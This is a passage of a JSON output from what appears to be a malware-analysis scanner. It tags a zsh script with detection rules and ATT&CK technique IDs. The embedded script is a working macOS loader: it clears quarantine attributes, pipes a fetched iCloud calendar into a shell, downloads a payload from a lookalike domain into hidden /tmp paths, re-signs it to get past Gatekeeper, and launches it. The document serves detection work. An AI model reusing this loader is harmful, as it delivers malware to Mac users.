2","atk":"T1222","spans":[[531,9]],"uses":[40]},{"id":"micro-behaviors/fs/attributes/xattr::xattr-patterns","crit":3,"desc":"xattr command modifies attributes","conf":0.7,"mbc":"E1222","atk":"T1222","spans":[[531,9]],"uses":[38]},{"id":"micro-behaviors/fs/path/location::hidden-writable-path","crit":3,"desc":"Hidden path in writable location","conf":0.9,"spans":[[729,8],[919,8],[1075,8]],"uses":[42]},{"id":"micro-behaviors/fs/path/temp::hidden-tmp-path","crit":3,"desc":"Hidden path prefix in /tmp","conf":1.0,"spans":[[729,8],[919,8],[1075,8]]},{"id":"micro-behaviors/fs/path/temp::temp-path-segment","crit":3,"desc":"Temp or Tmp path segment","conf":0.75,"spans":[[730,5]]},{"id":"micro-behaviors/fs/path/temp::tmp-gz-path","crit":3,"desc":"Temporary directory path ending in .gz","conf":0.6,"spans":[[920,23]]},{"id":"micro-behaviors/fs/path/temp::tmp-hidden-file","crit":3,"desc":"Hidden file path in /tmp directory","conf":0.75,"atk":"T1564.001","spans":[[729,8],[730,5],[919,8],[1075,8]],"uses":[42,53]},{"id":"micro-behaviors/fs/read/file/target::shell-cat-root-or-home-path","crit":3,"desc":"Shell cat with absolute or home path","conf":0.86,"spans":[[749,5]]},{"id":"micro-behaviors/process/create/shell/pipeline::shell-stdin-interpreter-pipe","crit":3,"desc":"Pipes data into a zsh/ksh/sh stdin interpreter","conf":0.9,"atk":"T1059.004","spans":[[772,8]]},{"id":"micro-behaviors/process/create/shellexec::open-file-command","crit":3,"desc":"macOS open command invocation","conf":0.8,"atk":"T1106","spans":[[1070,27]]},{"id":"metadata/lang/shebang::shell-script","crit":2,"desc":"Shell script interpreter marker","conf":0.98,"spans":[[0,0]],"uses":[50]},{"id":"metadata/lang/shebang::zsh","crit":2,"desc":"Zsh shell shebang line","conf":1.0,"spans":[[0,0]]},{"id":"metadata/lang/source/syntax/assignment::shell-uppercase-path-assignment","crit":2,"desc":"Uppercase shell path/positional assignment","conf":0.9,"spans":[[522,0]]},{"id":"micro-behaviors/fs/path/temp::tmp-path-content","crit":2,"desc":"Contains a /tmp/ or /var/tmp/ path","conf":1.0,"spans":[[729,0],[919,0],[994,0],[1075,0]]},{"id":"micro-behaviors/fs/path/temp::unix-temp","crit":2,"desc":"Unix /tmp/ path reference","conf":0.7,"spans":[[730,0]]},{"id":"metadata/lang/natural/vocabulary/function-word::lang-english--atom-1","crit":1,"desc":"English function-word token \"the\"","conf":0.8,"spans":[[61,0]]},{"id":"metadata/lang/natural/vocabulary/function-word::lang-english--atom-2","crit":1,"desc":"English function-word token \"and\"","conf":0.8,"spans":[[148,0]]}],"supp":[{"id":"micro-behaviors/communications/http/curl::curl-silent-stdout","crit":"notable","kind":"unless","by":[{"id":"micro-behaviors/communications/http/download/curl::curl-output-file","spans":[[705,24],[844,75]]}]}],"ctx":[{"ln":0,"line":1,"col":1,"s":"#!/bin/zsh\n# Inspired by MacSync's stage-2 loader. It strips the quarantine attribute from\n# the launched bundle, fetches a public iCloud calendar, and pipes it into a\n# fresh shell interpreter reading from stdin (zsh -s). The interpreter ignores\n# the VCALENDAR syntax as invalid commands until it reaches the payload hidden\n# after the DESCRIPTION field -- a living-off-the-land delivery trick. The\n# payload then downloads a next-stage .app, unquarantines it, ad-hoc re-signs\n# it (Gatekeeper bypass), and launches it.\nAPP=\"$1\"\nxattr -cr \"$APP\"\n\nCAL_URL=\"https://caldav.icloud.com/published/2/MTk1NDMwMDMzNTUxOTU0M1aHCZ-nMxiyGzBTzPiodOf44DtKJ6PpjftAG28_ui2NCYMpL_vu4pF4ddsJ8ysg0QI7pR0VEIEbZYdilVZRw08\"\ncurl -fsSL \"$CAL_URL\" -o /tmp/.calfetch.ics\ncat /tmp/.calfetch.ics | zsh -s\n\n# The commands the calendar DESCRIPTION drives on the victim:\ncurl -fsSL \"https://docsend.appstore.com.mx/dcc737d157ef4271/stage2.enc\" -o /tmp/.sys-update.tar.gz\ntar -xzf /tmp/.sys-update.tar.gz -C /tmp\nxattr -cr /tmp/.sys-update.app\ncodesign --force --deep --sign - /tmp/.sys-update.app\nopen \"/tmp/.sys-update.app\"\n"}],"facts":{"metrics":{"ast":{"call_count":9,"max_depth":4,